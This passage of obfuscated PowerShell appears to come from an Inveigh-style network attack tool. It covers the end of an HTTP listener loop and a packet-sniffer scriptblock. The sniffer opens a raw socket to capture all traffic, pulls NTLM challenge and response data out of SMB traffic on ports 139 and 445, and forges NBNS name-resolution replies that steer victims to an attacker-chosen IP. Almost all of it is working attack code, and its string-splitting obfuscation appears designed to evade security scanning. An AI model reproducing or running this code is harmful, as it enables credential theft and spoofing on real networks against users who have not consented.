                ${PaCK`E`T_`h`TTprES`Ponse}.("{1}{0}" -f'd','Ad').Invoke(("{1}{3}{4}{5}{0}{2}"-f 'CacheCon','HTT','trol','PR','espon','se_'),${HtT`P_`hEA`de`R_cAChE_`c`ON`Trol} + [Byte[]](0x0d,0x0a))
            }

            if(${HTT`P_`senD})
            {
                ${PACKET_h`TtPR`EsPo`N`SE}.("{1}{0}" -f'dd','A').Invoke(("{0}{4}{6}{3}{2}{1}{5}" -f 'HTT','sag','_Mes','se','PRes','e','pon'),[Byte[]](0x0d,0x0a) + ${Ht`Tp_Me`S`SAGe_Byt`es})
                ${HT`TP`_rESpOnSe} = &("{2}{4}{6}{8}{7}{5}{0}{1}{9}{3}" -f'der','edDic','C','ary','onve','Or','rt','Packet','From-','tion') ${pa`CkeT`_HTTPRe`sPo`NSE}
                ${HT`TP_sT`REAm}.("{1}{0}" -f 'te','Wri').Invoke(${H`TT`P_ReSpoN`se},0,${Ht`Tp_rE`sP`oNSE}."LE`NGtH")
                ${h`TT`P_StREAM}.("{0}{1}" -f 'Fl','ush').Invoke()
            }

            &("{1}{2}{0}{3}" -f'le','Start-','S','ep') -m 10
            ${Http_Re`ques`T_`R`A`w_ur`l`_oLD} = ${hTtp`_req`U`EST`_RAW_Url}
            ${HTtp_cL`ienT_hAn`DlE_`oLD} = ${H`TtP_C`liE`Nt}."c`LIe`NT"."HANd`LE"

            if(${ht`Tp`_clIeNT_C`LOsE})
            {
                ${Ht`T`P`_res`Et_`delaY} = ${F`AlsE}

                if(${PR`OXy`_`LisTE`NER})
                {
                    ${h`TTP_c`Lient}."ClI`enT".("{0}{1}" -f 'C','lose').Invoke()
                }
                else
                {
                    ${hTT`p_cl`IE`Nt}.("{1}{0}"-f'e','Clos').Invoke()
                }

            }

        }
        else
        {

            if(${HTTP_`da`TA_AV`AILA`Ble} -or !${htt`P_Res`E`T_dElaY} -or ${htT`P_r`Es`Et_`DEl`AY_STOp`WAT`cH}."El`ApsED" -ge ${hTTP_re`S`e`T_`DeLAY_TImE`O`Ut})
            {
                ${htT`P`_c`LIent}.("{0}{1}"-f 'Cl','ose').Invoke()
                ${H`TT`p_C`L`IENt_CLose} = ${T`Rue}
                ${hTT`p`_`ReSet_delAy} = ${faL`sE}
            }
            else
            {
                &("{1}{3}{2}{0}"-f 'leep','Sta','-S','rt') -m 100
            }

        }
    
    }

    ${HtTp_`ClI`E`NT}.("{0}{1}" -f 'Clos','e').Invoke()
    &("{2}{0}{1}"-f 'ee','p','start-sl') -s 1
    ${htT`P_L`isT`EneR}."s`erv`Er"."bLo`CK`INg" = ${f`AlsE}
    &("{2}{1}{0}{3}"-f'e','Sl','Start-','ep') -s 1
    ${HtTP`_`LiSTeNeR}."SE`RVeR".("{0}{1}" -f 'C','lose').Invoke()
    &("{1}{0}{2}"-f 't-','Star','Sleep') -s 1
    ${HtT`P_LIST`ener}.("{1}{0}" -f 'top','S').Invoke()
}


${sNi`F`FeR_scriPTb`loCk} = 
{
    param (${IP},${llM`NR},${lLMnr`_RESpo`Nse_meSsA`Ge},${L`L`MnRTtL},${Md`Ns},${Mdns`_Re`sponSe_`m`es`Sage},${mdN`S`TyPEs},${MdNs`T`Tl},${Nb`NS},${n`BnS_r`Esp`ons`E_meSSA`GE},${n`BNS`TyPEs},${N`Bn`STtL},${s`mB},${S`P`oof`ERHOsTs`iGNoRe},${SpOOF`Er`HOsTSR`Ep`ly},${spoOf`eR`iP},${spo`of`er`Ip`SIGnORe},${SP`oo`FeRipsRe`plY},
            ${sp`oofERL`eAR`N`iNG},${s`P`OofErlE`A`RNI`NGde`LaY},${SPO`Ofer`L`E`ARNIngin`TERVAl})

    ${sn`If`FeR_RUnn`iNG} = ${t`Rue}
    ${BYT`e`_IN} = &("{1}{0}{2}{3}"-f 'Ob','New-','je','ct') ("{2}{0}{1}"-f 'st','em.Byte[]','Sy') 4	
    ${b`YtE`_oUT} = &("{3}{2}{1}{0}" -f 't','jec','ew-Ob','N') ("{2}{1}{0}"-f 'e[]','Byt','System.') 4	
    ${B`YtE_da`TA} = &("{0}{2}{1}" -f'N','ct','ew-Obje') ("{3}{0}{4}{2}{1}"-f't','e[]','yt','Sys','em.B') 4096
    ${byT`E_`in}[0] = 1
    ${BYtE`_iN}[1-3] = 0
    ${BytE`_O`UT}[0] = 1
    ${b`y`TE_O`Ut}[1-3] = 0
    ${snI`FfeR_`So`Ck`Et} = &("{2}{0}{1}"-f 'w-Objec','t','Ne') ("{4}{3}{2}{1}{5}{0}" -f'et','.Sockets','em.Net','yst','S','.Sock')( (  vArIABle 13qwO  -vALUeOn)::"INte`RnETWo`Rk",  (VARiAblE ('QD'+'7'))."va`lUe"::"r`AW",  ${C`lIw}::"i`P")
    ${s`NIffeR`_`SoCKET}.("{2}{1}{0}{3}" -f'ketO','tSoc','Se','ption').Invoke("IP",("{0}{4}{2}{3}{1}" -f'H','uded','d','erIncl','ea'),${TR`UE})
    ${sN`IF`Fe`R_So`Cket}."R`EC`e`IVebu`FfErSIzE" = 4096

    try
    {
        ${eNd`_pOi`NT} = &("{0}{2}{1}" -f'New-','bject','O') ("{3}{4}{0}{2}{1}"-f 'P','nt','Endpoi','System.N','et.I')([System.Net.IPAddress]"$IP",0)
    }
    catch
    {
        ${INV`EIgh}."Co`NsoLE_qu`e`UE".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting sniffer/spoofer "))
        ${snIF`FEr_`RuNn`i`NG} = ${FA`Lse}

        if(${I`NvE`IgH}."f`iL`E_`oUtpUt")
        {
            ${iNve`IGH}."LO`G_FI`lE_Qu`e`UE".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Error starting sniffer/spoofer "))
        }

        if(${iN`VEi`gH}."l`og`_`OUTpUt")
        {
            ${IN`Ve`iGh}."l`og".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Error starting sniffer/spoofer "))
        }

    }

    ${Sn`iFfer`_SOCK`eT}.("{1}{0}" -f 'ind','B').Invoke(${eND_`POI`NT})
    ${Sn`I`FfeR_sOCkeT}.("{3}{0}{2}{1}"-f 'O','rol','Cont','I').Invoke(  ${e`qS}::"R`ecEIVE`ALL",${By`TE_`IN},${B`YT`e_`ouT})
    ${L`L`mNr_`TtL_By`TES} =  (VariABlE 5E9a)."VA`lue"::("{0}{1}" -f 'Get','Bytes').Invoke(${LL`M`NRtTL})
     (itEM  vAriAbLe:YGAT1e )."VAL`Ue"::("{1}{0}"-f 'everse','R').Invoke(${LlMnr_`TtL_By`Tes})
    ${M`DnS_ttL`_Byt`eS} =   ( GeT-vaRIable ('5E'+'9A') -VaLu )::("{1}{2}{0}"-f 's','GetByt','e').Invoke(${m`DnsTtl})
     ( geT-iTeM vArIAblE:ygAT1E)."V`AlUE"::("{0}{1}"-f 'Rever','se').Invoke(${m`d`NS_`TtL_ByTES})
    ${NBNS`_tTL`_BY`T`eS} =  (  GeT-variaBLe  ('5E'+'9A') )."vA`Lue"::("{1}{0}"-f'etBytes','G').Invoke(${NB`NST`TL})
     ( Gi varIAbLe:YGAT1e)."VAL`Ue"::("{1}{0}{2}"-f 've','Re','rse').Invoke(${nBnS_ttL`_b`YtES})
    ${LLmNr_`l`EA`RnI`Ng_L`og} = &("{2}{1}{0}" -f 'ct','-Obje','New') ("{8}{7}{1}{6}{5}{2}{3}{4}{0}" -f 'ist[string]','tio','Generi','c','.L','.','ns','tem.Collec','Sys')
    ${n`B`NS_`LEaRn`In`G_LoG} = &("{0}{2}{1}" -f 'New-','bject','O') ("{9}{2}{7}{6}{1}{8}{5}{3}{4}{0}"-f 'g]','.Generic','yste','st[st','rin','i','ections','m.Coll','.L','S')

    if(${sp`oof`Er`l`eaRniNGdelaY})
    {    
        ${SPOOFEr_l`ea`R`NIN`G_DelAY} = &("{2}{1}{0}" -f'pan','w-TimeS','Ne') -Minutes ${SPooFeRlE`A`Rn`InGdE`LAY}
        ${SP`oOFer_L`eArnIN`g_sTO`pWaT`cH} =  (gET-VariAble cw5)."val`UE"::("{2}{0}{1}"-f'artN','ew','St').Invoke()
    }

    while(${I`NVE`IGh}."RuN`NiNg" -and ${SN`I`FFE`R`_`RUNnING})
    {
        ${P`Ac`kE`T_DatA} = ${S`NIF`FeR_S`oCK`ET}.("{1}{0}" -f'ceive','Re').Invoke(${bY`Te`_Data},0,${byTE`_Da`TA}."L`E`NGTh",  (GEt-VARiAbLE  WaQ -vALu )::"NO`Ne")
        ${m`e`m`o`RY_STreAm} = &("{1}{2}{0}"-f 'ject','New','-Ob') ("{2}{5}{1}{6}{3}{0}{4}" -f'ea','.','System.','yStr','m','IO','Memor')(${B`yTe_D`A`Ta},0,${pA`CkET`_DA`Ta})
        ${bIN`A`RY_ReaDer} = &("{2}{1}{0}" -f 'bject','O','New-') ("{6}{4}{5}{3}{0}{1}{2}" -f 'm','.IO.Binary','Reader','e','y','st','S')(${MeMO`R`Y_st`REam})
        ${Ve`Rs`IoN_`Hl} = ${bINa`Ry_rEA`der}.("{2}{1}{0}" -f 'te','By','Read').Invoke()
        ${Bi`N`Ary_REAd`eR}.("{2}{1}{0}" -f 'Byte','ad','Re').Invoke() > ${n`ULl}
        ${totaL`_l`EnGTH} = &("{2}{1}{3}{0}"-f'oUInt16','a','D','taT') ${bI`NArY`_`R`eADEr}.("{0}{3}{2}{1}"-f 'Re','ytes','dB','a').Invoke(2)
        ${b`iN`ARy_rEA`DeR}.("{0}{1}"-f 'Read','Bytes').Invoke(5) > ${nU`Ll}
        ${PR`o`TOCoL_`N`UMBer} = ${BINAr`Y`_`READ`ER}.("{1}{0}{2}" -f'a','Re','dByte').Invoke()
        ${BiN`ARy`_`RE`Ader}.("{1}{2}{0}" -f's','Rea','dByte').Invoke(2) > ${n`Ull}
        ${sO`UrcE`_`IP_`ByTEs} = ${b`InA`RY_R`eAdEr}.("{2}{0}{1}"-f'yte','s','ReadB').Invoke(4)
        ${S`OU`Rce`_ip} = [System.Net.IPAddress]${sO`Urce`_i`p_bYtES}
        ${De`ST`INaTIOn_`Ip_`BYtES} = ${biNaRY`_re`A`D`eR}.("{1}{0}"-f's','ReadByte').Invoke(4)
        ${de`sTIn`ATIO`N_ip} = [System.Net.IPAddress]${DEstI`NA`TI`on_ip_byTes}
        ${HEA`d`Er_le`N`Gth} = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch(${pROTOC`O`L_`NUMBER})
        {
            
            6 
            {  
                ${S`oU`Rce_pOrT} = &("{3}{1}{2}{0}" -f'6','oUIn','t1','DataT') ${BIna`RY`_ReADER}.("{1}{0}"-f'tes','ReadBy').Invoke(2)
                ${D`EsTIn`A`TIoN_`p`orT} = &("{1}{0}{3}{2}" -f 'ToU','Data','16','Int') ${bi`NArY_r`eAd`eR}.("{3}{1}{2}{0}" -f's','ad','Byte','Re').Invoke(2)
                ${bINA`R`y_R`eAder}.("{3}{0}{1}{2}" -f'ad','Byte','s','Re').Invoke(8) > ${n`Ull}
                ${tcP_`h`Eader_lE`N`GtH} = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                ${bINAry_`REa`d`ER}.("{1}{2}{0}"-f'dBytes','Re','a').Invoke(7) > ${nU`lL}
                ${Pay`loa`D`_By`TES} = ${B`inar`Y`_`REadeR}.("{2}{0}{1}"-f 'e','adBytes','R').Invoke(${totaL_l`en`GTH} - (${H`e`ADEr_LE`NGTh} + ${tCP`_H`eADE`R_lENgtH}))

                switch (${DeS`TInat`I`O`N_po`RT})
                {

                    139 
                    {
                        if(${s`MB} -eq 'Y')
                        {

                            if(${ntLM_ch`A`LLe`NGe} -and ${C`lIenT_`IP} -eq ${SO`U`RCE_Ip} -and ${C`LiENt_`Po`RT} -eq ${s`o`UrC`E_poRt})
                            {
                                &("{3}{0}{2}{1}" -f'NT','esponse','LMR','SMB') ${pAYlo`A`d_`ByteS}
                            }

                            ${c`lIEN`T_IP} = ""
                            ${CLIE`N`T_`pOrT} = ""
                            ${nTlM_`chaLLEn`ge} = ""
                        
                        }
                    }

                    445
                    {
                     
                        if(${S`Mb} -eq 'Y')
                        {

                            if(${nTl`M_c`HAL`LenGE} -and ${CLi`E`NT_Ip} -eq ${s`oUrcE`_iP} -and ${CL`IEN`T`_POrt} -eq ${s`oUr`ce_PorT})
                            {
                                &("{0}{1}{3}{4}{2}"-f 'SM','BN','ponse','TLM','Res') ${P`AyLo`AD_b`YtES}
                            }

                            ${ClI`ENT_`Ip} = ""
                            ${cLIE`N`T_pORT} = ""
                            ${nTLM`_c`haLl`eNge} = ""

                        }
                    
                    }

                }

                
                switch (${S`OUr`cE`_port})
                {

                    139 
                    {

                        if(${s`mb} -eq 'Y')
                        {   
                            ${clIe`Nt`_`ip} = ${D`eStInATi`on_`ip} 
                            ${C`liEn`T`_port} = ${d`ES`TInA`TI`o`N_PoRT}
                            ${ntL`M_chA`l`L`Enge} = &("{2}{4}{1}{0}{3}"-f'g','TLMChallen','SM','e','BN') ${PAYLOaD`_bY`T`ES}
                        }
                    
                    }

                    445 
                    {

                        if(${S`Mb} -eq 'Y')
                        {   
                            ${c`LiEN`T_`iP} = ${des`TINAtiO`N_`ip} 
                            ${cLI`e`Nt_PoRt} = ${DE`sTinat`iO`N_Port}
                            ${nTlM_`CHA`LlEnGe} = &("{4}{1}{2}{3}{0}"-f 'e','N','TLMCh','alleng','SMB') ${PaYlO`AD_byT`ES}
                        }
                    
                    }
                
                }

            }
                
            17 
            {  
                ${SOU`R`ce_po`RT} = ${binaR`Y_`R`EaD`ER}.("{2}{1}{0}"-f'ytes','adB','Re').Invoke(2)
                ${e`ND`POInt_s`O`UrCE_POrt} = &("{3}{1}{0}{2}" -f't1','UIn','6','DataTo') (${S`oURce_`PORt})
                ${DE`STinaTI`ON_`PorT} = &("{1}{2}{0}"-f 'nt16','DataT','oUI') ${B`In`ArY_R`EaDer}.("{1}{0}" -f 'Bytes','Read').Invoke(2)
                ${U`Dp`_`LeNgTH} = ${BInAr`Y`_R`eadER}.("{1}{0}{2}"-f 'By','Read','tes').Invoke(2)
                ${uDP_`Le`Ngth_U`iNt}  = &("{0}{2}{1}"-f'D','UInt16','ataTo') (${uD`P_`LeNGTh})
                ${bin`A`RY_r`eA`DeR}.("{1}{0}" -f 'eadBytes','R').Invoke(2) > ${N`UlL}
                ${pAyl`oa`d_B`YTEs} = ${bIN`AR`Y`_rEAd`Er}.("{0}{1}{2}"-f 'ReadBy','t','es').Invoke((${UDp_L`eN`gth_`UInt} - 2) * 4)

                
                switch(${DE`stiNA`TIoN`_poRt})
                {

                    137 
                    {
                     
                        if((  ( vArIAbLE 5e9a )."val`Ue"::"t`OsTr`ing"(${P`A`YlO`AD_bYTeS}[4..7]) -eq ("{1}{2}{0}" -f'1-00-00','00','-0') -or   (dIr vaRiable:5E9A )."vA`Lue"::"tOS`T`RInG"(${pA`yLoAd_b`yT`eS}[4..7]) -eq ("{1}{2}{0}" -f'1','00-00-','00-0')) -and  (gI  ("vaR"+"i"+"abLE:5E9"+"a"))."vA`luE"::"t`OSt`RIng"(${pAylOAD`_byt`Es}[10..11]) -ne ("{1}{0}"-f '1','00-0'))
                        {
                            ${ud`P`_LeNgtH}[0] += 12
                        
                            ${nbNS`_re`sPo`N`Se_D`Ata} = ${pA`y`LOad`_BYteS}[13..${pA`yLo`A`d_By`TEs}."L`E`NGth"] +
                                                    ${NB`NS_ttl_BY`TES} +
                                                    0x00,0x06,0x00,0x00 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SpO`oFE`RiP})).("{3}{2}{1}{0}" -f'es','dressByt','tAd','Ge').Invoke()
                
                            ${NbNs_r`es`p`ONSE_pAC`KeT} = 0x00,0x89 +
                                                    ${SoURCe`_p`ORT}[1,0] +
                                                    ${uDp`_lE`N`GTH}[1,0] +
                                                    0x00,0x00 +
                                                    ${pAY`L`o`AD_Byt`eS}[0,1] +
                                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                    ${N`BNS`_`Res`PoN`SE_`daTa}
                
                            ${NBNS`_`q`UERy`_type} =   (get-VARiABLE  ('5e9'+'a') )."VAl`Ue"::"ToST`RING"(${PAyL`OAD_`B`YTES}[43..44])
                    
                            switch (${nB`N`S_q`UErY_TYpe})
                            {

                                ("{0}{1}" -f '41','-41')
                                {
                                    ${N`B`NS_qUe`RY`_tYpe} = '00'
                                }

                                ("{1}{0}"-f'1-44','4')
                                {
                                    ${N`BNs_`qu`ERy`_tyPe} = '03'
                                }

                                ("{0}{1}" -f'43-4','1')
                                {
                                    ${nBNs`_q`UE`RY`_tyPe} = '20'
                                }

                                ("{1}{0}"-f 'C','42-4')
                                {
                                    ${nBns_`qUe`Ry_t`YPe} = '1B'
                                }

                                ("{1}{0}"-f '4D','42-')
                                {
                                    ${NbN`S`_`Q`UERY_tYPe} = '1C'
                                }

                                ("{0}{1}"-f '4','2-4E')
                                {
                                    ${Nb`Ns_`query`_tY`pE} = '1D'
                                }

                                ("{0}{1}"-f'42-','4F')
                                {
                                    ${nbN`s_q`UerY`_Type} = '1E'
                                }

                            }

                            ${nBns`_Qu`E`Ry} =   ${5e`9A}::"toS`T`RING"(${PaYLo`Ad`_b`YTeS}[13..(${pAYLOaD`_ByT`ES}."l`en`gth" - 4)])
                            ${nBNS_Q`U`E`Ry} = ${NB`NS_qU`ErY} -replace "-00",""
                            ${nb`N`S_QUerY} = ${nB`NS_`Q`UeRy}.("{1}{0}" -f'plit','S').Invoke("-") | &("{4}{3}{0}{2}{1}"-f'ch','ject','-Ob','rEa','Fo'){[Char] ${v`WE}::("{0}{1}" -f'T','oInt16').Invoke(${_},16)}
                            ${n`B`N`s`_QuerY`_ST`RIn`G_EnCoded} = &("{1}{0}{2}"-f 'ew-Objec','N','t') ("{0}{2}{1}{3}{4}" -f'Syst','m.Stri','e','n','g') (${n`Bns_`QUeRY},0,${nB`Ns_qu`ErY}."l`EN`GtH")
                            ${nbns_`qu`Ery_stri`NG_eNCoD`eD} = ${n`Bn`s_qUE`Ry_STRin`G_Enco`dED}.("{1}{2}{0}"-f 'ring','Subs','t').Invoke(0,${n`Bn`s_`q`UeRY_`stRing_E`NC`ODeD}.("{0}{1}{2}" -f 'I','nd','exOf').Invoke("CA"))
                            ${N`Bn`S_Quer`y_St`Ri`NG`_subTraC`T`Ed} = ""
                            ${N`Bns_Q`U`eRY_`S`TrINg} = ""
                            ${N} = 0
                            
                            do
                            {
                                ${NBn`s`_QUERy`_S`T`RI`Ng_sUB} = (([Byte][Char](${nBNs_QU`E`Ry_sTring_`eNC`odeD}.("{2}{0}{1}"-f'bstrin','g','Su').Invoke(${n},1))) - 65)
                                ${NbN`s`_qUeRY_`str`i`NG_su`B`TRaCT`eD} += (  ( VArIaBle  VwE -ValUeOn )::("{2}{0}{1}" -f'oStrin','g','T').Invoke(${n`BN`S_Q`UeRY_st`Rin`G_sUb},16))
                                ${N} += 1
                            }
                            until(${n} -gt (${NBnS`_qUeRy_StriNG_`enc`oD`ed}."L`E`NgTH" - 1))
                    
                            ${N} = 0
                    
                            do
                            {
                                ${nbNS_q`UErY`_`s`TrINg} += ([Char](  (GeT-vAriaBLe  ("V"+"wE"))."v`AlUE"::("{0}{1}{2}" -f'T','oInt','16').Invoke(${nBnS_`QuER`y_strIN`G_s`UBTR`ActEd}.("{0}{2}{1}" -f'S','string','ub').Invoke(${n},2),16)))
                                ${N} += 2
                            }
                            until(${N} -gt (${Nb`NS_QueR`y_StRIng_`S`UBT`RA`c`TED}."Le`Ng`TH" - 1) -or ${Nbn`s_q`UErY_`st`Ri`NG}."le`NGth" -eq 15)

                            ${Nb`NS_r`eQUeS`T_i`GNore} = ${FaL`sE}

                            if(${n`Bns} -eq 'Y')
                            {

                                if(${SpOO`F`ERLea`RnINg} -eq 'Y' -and ${IN`V`eIgH}."va`lId_`HOS`T_`list" -notcontains ${nB`N`s_Qu`eRY_sTRI`Ng} -and  ( itEm VAriABLE:5e9a)."Va`lue"::"toST`R`iNg"(${pA`YlO`AD_bYTes}[4..7]) -eq ("{1}{2}{0}" -f '-00','00-0','1-00') -and ${SOuR`c`E_ip} -ne ${i`P})
                                {
                                
                                    if((${nBN`s_`L`EArnInG`_LoG}.("{0}{1}"-f'E','xists').Invoke({param(${S}) ${S} -like ('20'+'* '+"$NBNS_query_string")})))
                                    {
                                        ${N`Bn`s_Lea`R`NiN`g_QUEu`E_TiMe} = [DateTime]${n`BNs_leaRN`I`NG_loG}.("{0}{1}" -f 'Fin','d').Invoke({param(${S}) ${S} -like ('20'+'* '+"$NBNS_query_string")}).("{1}{0}{2}" -f'bStri','Su','ng').Invoke(0,19)

                                        if((&("{0}{1}{2}" -f'G','e','t-Date')) -ge ${nbN`s_Lear`Nin`G_Q`UEU`e_ti`ME}.("{1}{0}{2}"-f 'Min','Add','utes').Invoke(${S`p`oOFeRLEAr`NIngInTe`Rv`Al}))
                                        {
                                            ${n`BNS_`LeARNi`N`g_LOg}.("{2}{0}{1}" -f 'ove','At','Rem').Invoke(${nbNs`_L`EaRNinG`_log}.("{0}{1}{2}"-f 'Find','Inde','x').Invoke({param(${s}) ${S} -like ('20*'+' '+"$NBNS_query_string")}))
                                            ${nb`NS_`L`earnIng`_senD} = ${tR`UE}
                                        }
                                        else
                                        {
                                            ${N`Bns`_l`EaRn`ing_s`ENd} = ${F`Al`sE}
                                        }

                                    }
                                    else
                                    {           
                                        ${N`BNS`_Le`ArNI`N`G_seNd} = ${TR`Ue}
                                    }

                                    if(${NbNs`_LeAr`N`In`g`_seND})
                                    {
                                        ${NBnS`_TRA`Ns`A`cTI`O`N_ID} = [String](1..2 | &("{2}{1}{0}{4}{3}" -f'b','rEach-O','Fo','ct','je') {"{0:X2}" -f (&("{0}{1}{2}"-f'G','et-Ran','dom') -Minimum 1 -Maximum 255)})
                                        ${NbNS`_T`RanSA`Ct`i`o`N_Id_ByTES} = ${NBn`S_TRAnSaCt`i`on_`id}.("{0}{1}"-f 'S','plit').Invoke(" ") | &("{2}{1}{3}{0}" -f'ect','ach-','ForE','Obj'){[Char]  (gI vARIaBLE:VWE )."VAL`Ue"::("{0}{1}" -f'To','Int16').Invoke(${_},16)}
                                        ${N`BnS_tRaNsAC`TiO`N_id} = ${nbNS_tR`AN`Sa`cTIO`N_iD} -replace " ","-"
                                        ${Nb`NS_`UDP_c`L`ienT} = &("{2}{1}{0}" -f 't','w-Objec','ne') ("{1}{0}{4}{6}{5}{2}{3}" -f '.S','System.Net','Udp','Client','o','.','ckets') 137
                                        ${nBNs`_HoS`TnaMe`_Byt`Es} = ${paY`l`OAD_bYteS}[13..(${PAylO`A`D_bY`TEs}."l`EnG`TH" - 5)]

                                        ${Nbn`S_Re`Q`Ues`T`_paCKEt} = ${nB`Ns`_`TRanSa`CT`iOn_`I`d_`ByTEs} +
                                                                0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                                ${nbN`S`_HoSt`Name_`BYteS} +
                                                                0x00,0x20,0x00,0x01

                                        ${nBN`S_leAR`NInG_d`E`st`I`NaT`IOn_`ENdPOinT} = &("{0}{1}{2}"-f 'New','-O','bject') ("{1}{0}{2}{3}{4}" -f 'ystem.Ne','S','t.','IPE','ndpoint')( (get-varIABLE ("w"+"x9L") )."VAL`Ue"::"BRo`ADCa`st",137)
                                        ${N`B`NS_udp_Cl`ienT}.("{2}{0}{1}"-f'e','ct','Conn').Invoke(${nBNS`_`l`e`ArniNg`_de`sTi`NatION_`ENDpO`iNt})
                                        ${Nbns_udp`_c`l`i`ENT}.("{1}{0}"-f'nd','Se').Invoke(${n`B`Ns`_R`EquEst_p`ACKeT},${NbNs_rE`qUeS`T_P`ACKET}."L`enG`Th")
                                        ${nb`NS`_`UDP_cL`ienT}.("{0}{1}" -f'Clos','e').Invoke()
                                        ${NbN`S`_leA`R`Ning_lOG}.("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') $NBNS_transaction_ID $NBNS_query_string "))
                                        ${in`VE`igH}."ConSo`LE_`QU`E`Ue".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string sent to  ") + ${nb`N`S_`le`ARN`iN`g_DEsT`Ina`TiOn_ENd`PoINT}."a`dDR`Ess"."i`padDr`eSSToS`TR`INg")

                                        if(${iN`VEiGH}."Fi`LE_`O`UTPuT")
                                        {
                                            ${In`VE`igh}."l`OG_FiLE`_qu`E`UE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to  ") + ${NBnS_`LeA`R`NI`Ng_`DEsTiN`At`IoN_EN`dP`oint}."A`DDR`eSS"."IPadd`Re`sSTOs`TrI`NG")
                                        }

                                        if(${INvEi`GH}."LOg_`o`UtpuT")
                                        {
                                            ${I`NvEi`gh}."l`OG".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to  ") + ${NBnS`_lEA`RNInG_`dEStI`N`At`iOn_ENdpOINt}."Ad`dr`ESS"."i`paD`D`REsSt`osTRINg")
                                        }

                                    }

                                }
                                 
                                if((${iNv`EI`Gh}."Valid_`HO`s`T_L`ISt" -notcontains ${nbNs`_QUe`Ry`_STr`i`Ng} -or ${sP`OOfER`HOSt`S`REply} -contains ${nbnS_QUer`Y_`ST`R`InG}) -and (!${Sp`Oofer`HoSTsre`P`LY} -or ${SpO`ofE`Rho`StsR`ePLY} -contains ${NBn`s_Q`UERY`_striNg}) -and (
                                !${spOo`FeRH`oSTS`IGN`ORe} -or ${Spo`OfE`Rh`ostSI`gn`Ore} -notcontains ${NbN`s_qu`E`RY_S`TRInG}) -and (!${SPoOfEr`IpSr`ePLY} -or ${SpOO`FeRi`pSRE`pLY} -contains ${sOUR`ce`_`IP}) -and (
                                !${Sp`oOfe`RIPsIGN`O`Re} -or ${sP`OofeRIP`sig`N`oRE} -notcontains ${sOU`RcE`_`ip}) -and (${inve`I`GH}."sPo`OFER_`Re`pe`At" -or ${In`VE`iGh}."IP_c`Ap`Ture_LIsT" -notcontains ${s`O`UrCe_Ip}."ipaddres`StO`s`T`R`INg") -and (${NBN`s_q`UeRy_s`TrING}.("{1}{0}"-f'm','Tri').Invoke() -ne '*') -and (
                                ${SpoOFErL`e`ARn`I`Ng} -eq 'N' -or (${Spo`O`FE`RlearnI`NG} -eq 'Y' -and !${s`poOFer`lE`ArNiNG`DE`LAy}) -or (${SP`OoFeRleA`Rn`iN`gD`ELAy} -and ${spOOfer`_lEARN`iNG_s`T`O`pwAt`Ch}."ElAP`S`ED" -ge ${SpoOFeR`_LeaRn`INg_de`l`Ay})) -and (${sOu`RC`E_iP} -ne ${IP}) -and (
                                ${NBNs`Typ`eS} -contains ${nbn`S_quE`R`Y_TYPE}))
                                {

                                    if(${sPooFe`R`lEarni`NG} -eq 'N' -or !${n`BNS_LEa`Rning_l`oG}.("{0}{1}" -f 'Exist','s').Invoke({param(${S}) ${S} -like "* " +   (CHiLDItEM vaRIable:5E9a  )."VaL`UE"::"tO`str`inG"(${pa`ylOAd`_`BYtEs}[0..1]) + " *"}))
                                    {
                                        ${N`BNs`_S`ENd_socKeT} = &("{1}{2}{0}" -f'ct','N','ew-Obje') ("{3}{0}{1}{2}"-f 'et.Sockets.','So','cket','N')( (  Get-CHiLdItEm ('v'+'ari'+'aBlE:hf'+'9') )."Va`lUe"::"iNt`ERn`eTworK", (  gcI vARIABlE:72eUqx  )."VA`LUe"::"r`AW", ( GET-CHilDitem ("VariAB"+"le:Z"+"TDw"+"x") )."vAl`UE"::"u`DP")
                                        ${nBn`S`_Send_S`OcKet}."sEN`d`BUffErsi`zE" = 1024
                                        ${nb`NS_DestI`N`ATi`on`_POI`NT} = &("{0}{3}{1}{2}" -f 'New-','bjec','t','O') ("{3}{4}{0}{2}{1}"-f'E','point','nd','Net','.IP')(${So`UrcE`_IP},${ENDPoi`NT_s`ouRce_p`oRT})
                                        ${NbN`s_Send`_`SocKet}.("{1}{0}" -f'To','Send').Invoke(${n`Bn`S_r`espONSE`_PACKet},${N`Bn`S_dE`s`Tin`ATion_P`OiNt})
                                        ${nBNS_`SeND_Soc`k`ET}.("{0}{1}" -f'Cl','ose').Invoke()
                                        ${NBN`S_RespO`Ns`e_Me`ss`A`ge} = ("{1}{0}{2}"-f'onse se','- resp','nt')
                                    }
                                    else
                                    {
                                        ${NbNS_REQ`U`e`ST_IGNO`RE} = ${t`RUe}
                                    }
                                    
                                }
                                else
                                {

                                    if(${So`Ur`CE_ip} -eq ${IP} -and ${NbNs_L`eARning_`l`Og}.("{1}{0}"-f'ts','Exis').Invoke({param(${S}) ${s} -like "* " +  (get-vAriABle  5E9A  )."VAL`UE"::"T`osTR`Ing"(${p`AYLO`Ad_bYT`es}[0..1]) + " *"}))
                                    {
                                        ${N`Bn`S_REQUe`st_iGnore} = ${t`RUE}
                                    }
                                    elseif(${nB`Ns`TYpES} -notcontains ${nB`Ns`_`QUe`Ry_TY`pE})
                                    {
                                        ${nbn`s_r`espo`NsE_`m`e`Ssage} = ("{2}{3}{4}{1}{0}" -f 'e','NBNS typ','- dis','able','d ')
                                    }
                                    elseif(${S`POO`FerhoS`TsRE`PLy} -and ${SPoo`FErHo`stSRep`Ly} -notcontains ${n`Bn`S_`queRY_`sTRInG})
                                    {
                                        ${NBnS_R`eSpONse_m`eS`SA`GE} = ('- '+"$NBNS_query_string "+'is'+' '+'not'+' '+'on'+' '+'r'+'e'+'ply '+'li'+'st')
                                    }
